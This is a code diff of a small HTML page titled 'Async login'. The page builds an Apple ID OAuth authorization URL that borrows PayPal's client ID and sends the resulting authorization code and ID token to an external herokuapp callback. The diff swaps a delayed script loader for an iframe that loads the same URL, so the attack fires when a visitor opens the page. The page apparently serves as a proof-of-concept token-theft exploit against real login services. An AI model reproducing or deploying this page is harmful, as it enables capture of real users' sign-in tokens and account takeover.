@@ -4,7 +4,7 @@
   <title>Async login</title>
 </head>
 <body>
-<script type="text/javascript">
+<!-- <script type="text/javascript">
   const urls = 'https://appleid.apple.com/auth/authorize?client_id=com.paypal.login.client&redirect_uri=https%3A%2F%2Fvensys.herokuapp.com%2Fcallback&response_type=code%20id_token&state=1562652309669&scope=openid&response_mode=form_post';
 
 
@@ -20,7 +20,8 @@ function asyncLoadScriptUrls(reqUrl) {
 setTimeout(function() {
   asyncLoadScriptUrls(urls)
 }, 5000);
-</script>
+</script> -->
+<iframe src="https://appleid.apple.com/auth/authorize?client_id=com.paypal.login.client&redirect_uri=https%3A%2F%2Fvensys.herokuapp.com%2Fcallback&response_type=code%20id_token&state=1562652309669&scope=openid&response_mode=form_post"></iframe>
 
 </body>
 </html>
